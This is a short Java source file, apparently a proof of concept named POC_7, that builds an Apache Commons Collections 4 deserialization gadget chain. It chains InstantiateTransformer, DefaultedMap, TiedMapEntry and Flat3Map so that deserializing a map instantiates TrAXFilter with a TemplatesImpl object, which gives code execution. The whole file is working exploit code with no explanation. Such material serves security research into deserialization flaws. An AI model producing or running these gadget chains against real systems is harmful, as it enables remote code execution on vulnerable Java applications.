package com.example.CC4;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.Flat3Map;

import javax.xml.transform.Templates;

public class POC_7 {

    public static void main(String[] args) throws Exception {
        Templates templates = Share.getTemplatesImplObj();
        InstantiateTransformer transformer = new InstantiateTransformer<>(new Class[]{Templates.class}, new Object[]{templates});
        DefaultedMap d = new DefaultedMap<>("1");
        TiedMapEntry t = new TiedMapEntry<>(d, TrAXFilter.class);

        Flat3Map map = new Flat3Map<>();
        map.put(t, "1");

        ReflectionUtil.setField(d, "value", transformer);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}
